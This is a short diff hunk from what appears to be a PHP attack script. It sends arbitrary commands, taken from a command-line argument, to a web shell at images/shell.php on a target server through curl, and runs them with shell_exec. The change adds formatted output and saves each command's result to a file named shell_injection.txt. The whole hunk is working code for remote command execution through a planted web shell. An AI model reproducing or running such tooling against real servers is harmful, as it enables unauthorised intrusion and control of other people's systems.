@@ -123,6 +123,17 @@ if(curl_errno($curl)){
 $cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
 $shellcmd = $argv[4];
 
-echo shell_exec ($cmd.$shellcmd);
+$result = shell_exec ($cmd.$shellcmd);
+$result_txt = "-------------------------------------------------------------\n".
+			"Now running the shell command '" . $shellcmd . "' on web server.\n".
+			"Result:\n".
+			"----------------\n".
+			$result;
+echo $result_txt;
+
+$resultfile = fopen("shell_injection.txt", "w") or die("Unable to open file!");
+fwrite($resultfile, $result_txt);
+
+fclose($resultfile);
 
 curl_close($curl);
